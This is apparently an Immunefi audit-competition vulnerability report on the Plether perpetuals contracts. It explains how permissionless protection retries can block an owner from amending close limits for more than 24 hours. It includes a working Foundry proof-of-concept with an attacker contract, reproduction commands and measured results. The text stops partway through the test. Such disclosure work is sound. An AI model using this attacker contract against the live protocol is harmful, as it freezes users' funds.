# \#99947 [SC-High] Permissionless atomic protection retries can censor owner recovery for more than 24 hours

**Submitted on Nov 15th 2026 at 20:30:49 UTC by @adeolu for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99947
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

After a protected close fails or expires, the position protection is briefly placed in the only state in which its owner can amend obsolete close limits. However, any account can consume that state by retrying the close, including atomically in the same transaction that terminalizes the previous child. Every retry copies the unchanged limits into a fresh child with a fresh deadline, while the active protection prevents ordinary closing. An unprivileged attacker who repeatedly wins transaction ordering at those recovery points can therefore deny owner-controlled exit and keep the protected position and its recoverable margin lo'[\
cked for more than 24 hours.

## Vulnerability Details

### The owner can amend limits only during a narrow `Latched` state

The owner-only amendment entrypoint accepts a protection only when it is `Latched` and the account has no pending child. This is the intended recovery route after a generated close becomes unusable because one of its retained financial limits is no longer sufficient.

Source: [`PositionProtectionBook.sol` lines 315-328](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)

~~~solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
~~~

When a generated protection child fails or expires while the protected position still matches, `handleFailedProtectionAttempt` deletes the old attempt marker and restores `Latched`.

Source: [`PositionProtectionBook.sol` lines 637-667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667)

~~~solidity
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
~~~

This transition is supposed to let the owner repair the retained limits. It does not create an owner-priority interval.

The vulnerability is not that retries are permissionless or carry zero order-execution bounty in isolation. Those mechanics are documented. The vulnerability is that an arbitrary retry caller can atomically consume the same `Latched` state reserved for the owner-only repair function, without an owner authorization, owner-priority interval, acknowledged limit version, or cumulative retry bound. The caller can consequently keep repinning limits that only the owner is authorized to change.

### Permissionless retry accepts exactly the owner's recovery state

`retryPositionProtectionClose` is permissionless: it loads the active protection without checking `msg.sender` against `protection.account`. It accepts exactly the `Latched` and zero-pending-order state required by the owner amendment function, then asks the Router to create a replacement child.

Source: [`PositionProtectionBook.sol` lines 382-405](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)

~~~solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
        revert PositionProtectionBook__InvalidLinkedOrder();
    }
    uint64 expectedOrderId = router.nextCommitId();
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    if (linkedOrderId != expectedOrderId) {
        revert PositionProtectionBook__InvalidHostResponse();
    }
    _recordCloseAttempt(protection, linkedOrderId);
}
~~~

`_recordCloseAttempt` immediately changes the protection back to `Triggered`, closing the owner's amendment window.

Source: [`PositionProtectionBook.sol` lines 564-577](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L577)

~~~solidity
uint64 previousLinkedOrderId = protection.linkedOrderId;
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
_attemptProtectionIds[linkedOrderId] = protection.protectionId;
emit PositionProtectionCloseAttemptQueued(
    protection.protectionId, protection.account, linkedOrderId, previousLinkedOrderId
);
~~~

An attacker contract can consequently perform either of these sequences before returning control:

~~~solidity
router.executeOrder(failingChildId, executionData);
protectionActions.retryPositionProtectionClose(protectionId);
~~~

or, after a later child reaches its deadline:

~~~solidity
router.expireOrder(expiringChildId);
protectionActions.retryPositionProtectionClose(protectionId);
~~~

The first call terminalizes and removes the old child, temporarily producing `Latched` with zero pending orders. The second call immediately consumes that state. Because both calls execute inside one attacker transaction, the owner cannot amend between them. The `nonReentrant` modifiers do not prevent this because the first external call has fully returned and released its guard before the second call begins.

### Every retry copies the obsolete limits into a fresh permanent child

The delegated Router logic assigns every retry the current `nextCommitId`, constructs a new protocol client identity containing that ID, permanently registers it, marks it as a protection attempt, and queues it.

Source: [`OrderLiquidationBatchLogic.sol` lines 183-210](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L183-L210)

~~~solidity
orderId = host.nextCommitId();
OrderV3Types.OrderRequest memory request = _protectionCloseRequest(host, protectionId, side, size);
request.clientOrderId = OrderV3Types.protocolClientOrderId(
    keccak256(
        abi.encode(
            "PLETHER_POSITION_PROTECTION_RETRY_V3", block.chainid, address(this), account, protectionId, orderId
        )
    )
);
(uint64 registeredOrderId,, bool replayed) = host.lifecycleBook().registerPending(account, orderId, request, 0);
if (replayed || registeredOrderId != orderId) {
    revert IOrderLifecycleBook.OrderLifecycleBook__OrderIdAlreadyUsed(orderId);
}
host.lifecycleBook().registerProtectionAttempt(orderId);
_queueProtectionAttempt(host, orderId, account, side, size);
~~~

The replacement reads the same retained financial limits, receives a new maximum-length execution window, and has an explicit zero order-execution bounty. This is distinct from the nonzero, governance-configured protection-trigger bounty reserved when protection is created and paid once to the original trigger caller.

Source: [`OrderLiquidationBatchLogic.sol` lines 655-679](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L679)

~~~solidity
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);
request.side = side;
request.sizeDelta = size;
request.targetPrice = side == CfdTypes.Side.LONG ? host.engine().CAP_PRICE() : 1;
request.isClose = true;
request.bounds.submitBy = uint64(block.timestamp);
request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
request.bounds.allowedExecutionModes = ALL_V3_EXECUTION_MODES;
request.bounds.expectedConfigHash = bytes32(0);
request.bounds.maxExecutionBountyAssets = 0;
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
~~~

The Router advances `nextCommitId`, creates a zero-valued `BountyKind.Order` execution reservation, and inserts a pending full close with a fresh commit clock.

Source: [`OrderRouter.sol` lines 440-471](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L440-L471)

~~~solidity
if (linkedOrderId != nextCommitId) {
    revert OrderRouter__Unauthorized();
}
nextCommitId = linkedOrderId + 1;
clearinghouse.recordBountyReservation(account, IMarginClearinghouse.BountyKind.Order, linkedOrderId, 0);
_recordCommittedOrder(
    CfdTypes.Order({
        account: account,
        sizeDelta: size,
        marginDelta: 0,
        targetPrice: side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1,
        commitTime: uint64(block.timestamp),
        commitBlock: ExecutionBlockNumberLib.current(),
        orderId: linkedOrderId,
        side: side,
        isClose: true
    })
);
~~~

The account pending-order cap is only a simultaneous-live-record limit. Terminal settlement deletes the old child and decrements `pendingOrderCounts` before the attacker makes its second external call. Retry then inserts the replacement and increments the count from zero back to one; there is no cumulative retry limit.

Source: [`OrderCommitHandler.sol` lines 40-59](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderCommitHandler.sol#L40-L59)

~~~solidity
function _recordCommittedOrder(
    CfdTypes.Order memory order
) internal {
    // ...
    _linkGlobalOrder(orderId);
    _linkAccountOrder(account, orderId);
    if (++pendingOrderCounts[account] > maxPendingOrders) {
        revert OrderRouter__TooManyPendingOrders();
    }
    emit OrderCommitted(orderId, account, order.side);
}
~~~

The corresponding cleanup ordering is explicit in `_deleteOrder`: both queue links and account aggregates are removed before the terminal hook returns control to the caller.

Source: [`OrderRouterBase.sol` lines 117-140](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L117-L140)

~~~solidity
_unlinkAccountOrder(account, orderId);
_unlinkGlobalOrder(orderId);
record.status = terminalStatus;
if (account != address(0) && pendingOrderCounts[account] > 0) {
    pendingOrderCounts[account]--;
}
if (account != address(0) && record.core.isClose && pendingCloseSize[account] >= record.core.sizeDelta) {
    pendingCloseSize[account] -= record.core.sizeDelta;
}
_afterOrderDeleted(orderId, account, terminalStatus);
delete orderRecords[orderId];
~~~

### The owner has no alternative exit while the replacement is live

The attacker returns the protection to `Triggered` with one pending child. In this state:

- amendment reverts `OrderRouter__ProtectionNotLatched`;
- direct cancellation rejects every state other than `PendingOpen` or `Armed`;
- cancellation-and-close explicitly requires `Armed`; and
- ordinary V3 close admission rejects any account with an active protection.

The cancellation restriction is at [`PositionProtectionBook.sol` lines 408-419](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419), while cancellation-and-close's `Armed` requirement is at [`PositionProtectionBook.sol` lines 341-358](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L358).

Ordinary close admission is blocked here:

Source: [`OrderLiquidationBatchLogic.sol` lines 302-315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L302-L315)

~~~solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
~~~

Once the attacker's `expireOrder + retryPositionProtectionClose` transaction begins executing, the owner cannot interleave an amendment between its two calls: the attacker terminalizes the child and consumes `Latched` before that transaction returns. A stale child can also be terminalized before expiry by executing it against a valid price that violates its retained ceiling. An EOA owner must perform terminalization and owner-only amendment as separate transactions; the PoC demonstrates an attacker inserting retry between those transactions. A contract or account-abstraction wallet can batch terminalization, amendment, and retry while preserving its identity as the protection account. The PoC includes a separate control proving that this atomic owner bundle succeeds when sequenced first. Censorship therefore depends on transaction ordering whenever such an owner actively contests recovery; it does not give the attacker exclusive access to expiry or terminalization.

### Distinction from disclosed and previous findings

This report was compared against the program's published limitations and the closest previous findings concerning position protection. It has a different root cause and requires a different fix:

- **Cecuro `MED-9` — retries lacked trader financial limits.** `MED-9` reported that protection attempts were created with effectively unlimited financial maxima. Its published fix retained the trader's limits, copied them into every attempt, and introduced the owner-only `Latched` amendment path. The audit response expressly says that tight limits may prevent execution until conditions improve or the owner amends them. This report begins after that fix is working: the child correctly fails its retained `maxExecutionNotionalAssets` ceiling, but an arbitrary caller repeatedly prevents the owner from using the new amendment path. Adding retained limits fixed `MED-9` but did not fix this censorship; conversely, adding owner authorization or an owner-priority interval does not add the financial caps required by `MED-9`. See [Cecuro `MED-9`, PDF page 27](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=27).
- **Published zero order-execution bounty limitation and the AI-scan keeper-incentive finding.** The program discloses that failed-attempt cleanup is unpaid and that every retry creates a fresh close record whose `BountyKind.Order` amount is zero. The earlier scan reports that this can leave a close unprocessed because rational keepers lack compensation after the separate one-time protection-trigger bounty is paid. This report assumes the opposite behavior: a malicious caller willingly pays gas to process every expiry and append every replacement. Funding retries or delaying the trigger bounty could address the earlier incentive failure but would not remove the attacker's permission to consume the owner's repair state; a retry bounty could even subsidize the censorship. Owner authorization or priority would stop this attack but would not fund honest execution. See [the earlier keeper-incentive finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L542-L584).
- **Cecuro `MED-15` — zero adjusted execution price.** `MED-15` concerned a SHORT attempt whose oracle execution price became zero and repeatedly failed slippage. Its fix rejects zero prices and constrains confidence configuration. This PoC executes at a positive `1.1e8` price and authenticates `ConstraintViolation(ExecutionNotional)` caused by an obsolete owner ceiling. The zero-price fix does not affect retry authorization or amendment ordering. See [Cecuro `MED-15`, PDF page 39](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=39).
- **Cecuro `MED-30` — protection triggering during frozen markets.** `MED-30` concerned an `Armed` protection that could not trigger during a frozen oracle window. Its fix added an owner-only atomic cancel-and-close path for `Armed` protection and expressly excluded `Triggered` and `Latched` records. This PoC uses a successfully triggered protection and attacks the later `Triggered -> Latched -> Triggered` recovery loop under a valid live price. Changing frozen-market trigger policy does not fix this loop, while owner-prioritized recovery does not make frozen-market activation available. See [Cecuro `MED-30`, PDF page 69](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=69).
- **Cecuro `LOW-50` — reservation-mismatch cleanup removed protection.** `LOW-50` concerned a special reservation-mismatch cleanup path that terminalized protection instead of relatching it. Its fix correctly routes an unchanged position back to `Latched`. This PoC does not create a reservation mismatch: it uses an ordinary typed constraint failure followed by canonical expiries, and correct relatching is a prerequisite to the attack. Repairing mismatch cleanup does not authorize owner recovery, and owner-prioritized recovery does not repair mismatched reservations. See [Cecuro `LOW-50`, PDF pages 170-171](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=170).
- **Trigger-timing findings `MED-8`, `MED-17`, `MED-23`, and `MED-28`.** Those findings concern L2 block-number reuse, oracle publication-time progress, mixed-time baskets, or stale arming geometry before a protection can trigger. The PoC reaches a valid trigger through the production entrypoint and begins only after its close child exists. Their block-clock and oracle-synchronization fixes neither prevent nor repair post-trigger retry censorship.

Under the program's duplicate test, fixing any of the earlier findings does not automatically fix this one, and fixing this issue does not automatically fix any of them. The shared protection state machine and zero order-execution bounty records are overlapping mechanics, not the shared root cause.

### Executed attack path

1. Alice deposits through the Clearinghouse and opens a real `10,000e18` SHORT through public `commitOrder` and `executeOrder`, supplying `2,000e6` margin at a `1e8` mark. After opening charges, the Engine stores `1,986e6` of position margin.
2. Alice configures a trigger at `1.05e8` and a `10,605e6` execution-notional ceiling, giving one percent headroom over the `10,500e6` notional at the trigger. A snapshot control executes the original child successfully at `1.05e8`, proving the retained limit was usable when the close was queued.
3. Before delayed execution, the price moves to `1.1e8`. Execution notional becomes `11,000e6`, above the previously valid ceiling. The child terminally fails with authenticated `ConstraintViolation(ExecutionNotional)`.
4. The attacker contract forwards a nonzero mocked Pyth fee to the payable production `executeOrder` entrypoint and invokes permissionless retry in the same transaction. It ends with a new `Triggered` child rather than exposing `Latched` to Alice.
5. The PoC separately has EOA Alice terminalize that replacement before expiry. Because amendment requires a second EOA transaction, the attacker inserts retry between them; Alice's amendment, cancellation, cancellation-and-close, and ordinary close then revert.
6. After every later replacement deadline, the attacker atomically calls `expireOrder(currentChildId)` and `retryPositionProtectionClose(protectionId)`. Each cycle permanently expires the old child, copies the same obsolete limit into a fresh ID and deadline, and keeps the live count exactly one.
7. The test derives the required cycle count from the Router's execution window. At the frozen configuration it performs 1,417 renewals: `1,417 * 61 = 86,437` seconds, or 24 hours and 37 seconds. Every simulated renewal also advances the block number.
8. One complete expiry-and-retry call runs with normal gas metering and consumes 925,161 test-EVM gas. Aggregate metering is paused only for the remaining long loop so Foundry's single synthetic outer transaction does not truncate 1,417 state transitions.
9. Throughout that period, the complete `10,000e18` position and its stored `1,986e6` margin remain in the Engine. In the honest control, the attacker stops, Alice amends, the repaired child closes, and `995.591318` USDG of net settlement is released and actually withdrawn to Alice after price settlement and accrued charges.
10. A separate contract-wallet control wins ordering with one atomic `expire + amend + retry` bundle and installs the repaired limit. This bounds the claim: the vulnerability censors recovery when the attacker consumes the repair state first; it does not make recovery impossible regardless of transaction ordering.

### Recommended remediation

Reserve the first recovery opportunity after a failed attempt for the protection owner. Robust designs include requiring owner authorization for every retry or binding retry to an owner-approved close-limit version. If permissionless liveness is required, introduce an owner-only recovery interval after relatching and allow `Latched` cancellation or atomic owner amendment-and-retry. A cooldown alone is weaker because an attacker can still consume every window once it opens. A cumulative retry bound can provide an additional backstop but should not replace owner authority over retained financial limits.

## Impact Details

**Selected in-scope impact: High — Temporary freezing of funds for at least 24 hours.**

The attack prevents the owner from closing the protected position and therefore prevents release of its pledged margin. The Engine's stored position record remains at `1,986e6` margin atoms throughout the attack, but that stored value is not presented as the owner's eventual net recovery: carry and close economics accrue during the 24-hour warp. The honest control measures the economically stronger result. Once censorship stops and the same position closes at `1.1e8`, `995.591318` USDG of net settlement is released into Alice's free balance and successfully withdrawn to her wallet. That amount was unavailable while the complete `10,000e18` position remained open.

Continued market movement can additionally change PnL, recoverability, or liquidation risk during censorship. The demonstrated scenario holds the execution price at `1.1e8`, above the stale `10,605e6` ceiling, and remains healthy through the measured interval. The impact claim assumes the child remains economically unexecutable under its retained limit, the account is not liquidated, and the attacker wins ordering whenever the owner actively contests recovery.

The PoC produces this measured state after 1,417 permissionless renewals:

~~~text
single expire-and-retry call gas: 925161
permissionless renewal cycles: 1417
elapsed censorship seconds: 86437
latest replacement child id: 1421
locked position size: 10000000000000000000000
locked live margin assets: 1986000000
stale execution notional ceiling: 10605000000
current execution notional: 11000000000
recoverable settlement released after censorship: 995591318
~~~

The attacker does not receive the frozen funds. Replacement children pay no order-execution bounty, although the attacker could also be the original trigger caller and receive the separate one-time protection-trigger bounty. The PoC deliberately assigns that trigger to a distinct keeper, so its renewal attacker receives no bounty. The continuing attack otherwise costs one transaction per renewal; the metered production call path consumes 925,161 test-EVM gas per `expire + retry`, or approximately 1.31 billion such gas units over 1,417 renewals before chain-specific transaction and data pricing. Actual Arbitrum cost depends on execution and L1 data fees at the time of attack.

A contract or account-abstraction owner can end the attack by having its atomic terminalization-and-amendment bundle sequenced first. An EOA can terminalize early but must race the attacker's retry before its separate amendment transaction. These are feasibility constraints, not hidden assumptions. The program determines impact before feasibility and separately lists temporary freezing of funds for at least 24 hours as High; the PoC directly asserts and exceeds that duration by 37 seconds.

The PoC position is a deterministic regression fixture, not an upper bound on affected value. For a valid larger protected position, the number and shape of renewal transactions remain the same: retry replaces one full-close record, and its execution cost does not scale linearly with position size or recoverable margin. The gas-to-damage ratio therefore improves as the targeted valid position grows. Transaction ordering, the victim's account type and response, current chain fees, continued price conditions, and concrete value at risk remain feasibility considerations.

This should not be classified as Critical permanent freezing. The honest control proves recovery succeeds once the attacker stops. No single renewal makes the funds irretrievable forever; the attacker must continue renewing the lock.

## References

- [Frozen competition repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)
- [`PositionProtectionBook.retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)
- [`PositionProtectionBook._recordCloseAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L577)
- [`PositionProtectionBook.handleFailedProtectionAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667)
- [`OrderLiquidationBatchLogic.commitProtectionCloseAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L183-L210)
- [`OrderLiquidationBatchLogic._protectionCloseRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L679)
- [`OrderRouter.executePositionProtectionTriggerItem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L440-L471)
- [`OrderCommitHandler._recordCommittedOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderCommitHandler.sol#L40-L59)
- [`OrderRouterBase._deleteOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L117-L140)
- [Local proof of concept: `PermissionlessProtectionRetryCensorship.t.sol`](../packages/perps/test/perps/regression/PermissionlessProtectionRetryCensorship.t.sol)


## Proof of Concept


## Proof of Concept

### Prerequisites

- Git
- Foundry (verified locally with Forge v1.0.0-stable; the repository CI installs `foundry-rs/foundry-toolchain@v1`)
- Solidity 0.8.35, selected according to `packages/perps/foundry.toml`

No RPC URL, fork, public network, or external service is required.

### Fresh-clone reproduction

1. Clone the frozen competition repository and initialize all submodules:

~~~bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
~~~

2. Create `packages/perps/test/perps/regression/PermissionlessProtectionRetryCensorship.t.sol` with the complete file below. This is the only file that must be added:

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @dev A real caller contract is required to demonstrate that terminalization and permissionless retry can be
///      combined before control returns to the position owner. This contract contains no protocol state or mocks.
contract AtomicProtectionRetryAttacker {

    function executeFailingAttemptAndRetry(
        OrderRouter router,
        IPositionProtectionActions protectionActions,
        uint64 protectionId,
        uint64 failingChildId,
        bytes[] calldata executionData
    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 replacementChildId) {
        result = router.executeOrder{value: msg.value}(failingChildId, executionData);
        replacementChildId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        OrderRouter router,
        IPositionProtectionActions protectionActions,
        uint64 protectionId,
        uint64 expiringChildId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 replacementChildId) {
        result = router.expireOrder(expiringChildId);
        replacementChildId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    function retry(
        IPositionProtectionActions protectionActions,
        uint64 protectionId
    ) external returns (uint64 replacementChildId) {
        replacementChildId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    receive() external payable {}

}

/// @dev Minimal contract-wallet owner used only to prove the transaction-ordering limitation. Because this contract is
///      itself the protection account, it can terminalize, amend, and retry without changing `msg.sender` at the Book.
contract AtomicProtectionOwnerWallet {

    address internal immutable CONTROLLER;

    constructor(
        address controller
    ) {
        CONTROLLER = controller;
    }

    function expireAmendAndRetry(
        OrderRouter router,
        IPositionProtectionActions protectionActions,
        uint64 protectionId,
        uint64 expiringChildId,
        PositionProtectionTypes.CloseFinancialLimits calldata repairedLimits
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 replacementChildId) {
        require(msg.sender == CONTROLLER, "controller only");
        result = router.expireOrder(expiringChildId);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);
        replacementChildId = protectionActions.retryPositionProtectionClose(protectionId);
    }

}

/// @notice Demonstrates that an untrusted caller can continuously consume the owner's only amendment state.
/// @dev All protocol state is reached through public production entrypoints. The existing BasePerpTest deployment,
///      settlement-token fixture, and Pyth fixture are used, but this test performs no direct Engine order calls,
///      storage writes, mocked callbacks, or hand-built position/protection state.
contract PermissionlessProtectionRetryCensorshipRegressionTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant TRIGGER_PRICE = 1.05e8;
    uint256 internal constant FAILURE_PRICE = 1.1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant PYTH_FEE = 1 gwei;

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    AtomicProtectionRetryAttacker internal attacker;
    AtomicProtectionOwnerWallet internal ownerWallet;

    struct AttackFixture {
        address account;
        uint64 protectionId;
        uint64 firstChildId;
        uint256 openedSize;
        uint256 liveMarginAssets;
        uint256 staleNotionalCeilingAssets;
    }

    function setUp() public override {
        super.setUp();

        protectionActions = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        attacker = new AtomicProtectionRetryAttacker();
        ownerWallet = new AtomicProtectionOwnerWallet(address(this));
    }

    function test_AtomicPermissionlessRetriesCensorOwnerRecoveryUntilAttackerStops() public {
        AttackFixture memory fixture = _openShortAndTriggerStaleProtection(ALICE);
        _startRecordingLogs();

        // Use a nonzero oracle fee so the atomic attacker call has production-shaped ETH funding and forwarding.
        baseMockPyth.setFee(PYTH_FEE);
        vm.deal(address(this), 1 ether);

        bytes[] memory failingExecutionData = _mockPythUpdateData(FAILURE_PRICE);
        uint256 failingExecutionFee = router.pletherOracle().getOrderExecutionFee(failingExecutionData);
        assertGt(failingExecutionFee, 0, "fixture must exercise nonzero Pyth fee forwarding");
        (OrderV3Types.ExecutionResult memory failed, uint64 currentChildId) = attacker.executeFailingAttemptAndRetry{
            value: failingExecutionFee
        }(
            OrderRouter(address(router)),
            protectionActions,
            fixture.protectionId,
            fixture.firstChildId,
            failingExecutionData
        );

        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed), "bounded close must fail");
        assertEq(
            uint8(failed.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "stale notional ceiling must cause a typed terminal failure"
        );
        OrderV3Types.CompactOutcome memory failedOutcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), fixture.firstChildId);
        assertEq(
            uint8(failedOutcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.ExecutionNotional),
            "receipt must authenticate the stale execution-notional ceiling"
        );
        assertEq(
            failedOutcome.failureSelector,
            ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
            "receipt must preserve the policy failure selector"
        );
        assertGt(currentChildId, fixture.firstChildId, "atomic retry must allocate a fresh permanent child id");
        _assertReplacementMaintainsLock(fixture, currentChildId);
        _assertOwnerRecoveryBlocked(fixture, currentChildId);

        // An EOA owner can terminalize the stale child before its deadline, but amendment is a second transaction.
        // The attacker can insert a permissionless retry between those transactions and consume Latched again.
        bytes[] memory ownerExecutionData = _mockPythUpdateData(FAILURE_PRICE);
        uint256 ownerExecutionFee = router.pletherOracle().getOrderExecutionFee(ownerExecutionData);
        vm.deal(fixture.account, ownerExecutionFee);
        vm.prank(fixture.account);
        OrderV3Types.ExecutionResult memory ownerTerminalized =
            router.executeOrder{value: ownerExecutionFee}(currentChildId, ownerExecutionData);
        assertEq(
            uint8(ownerTerminalized.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
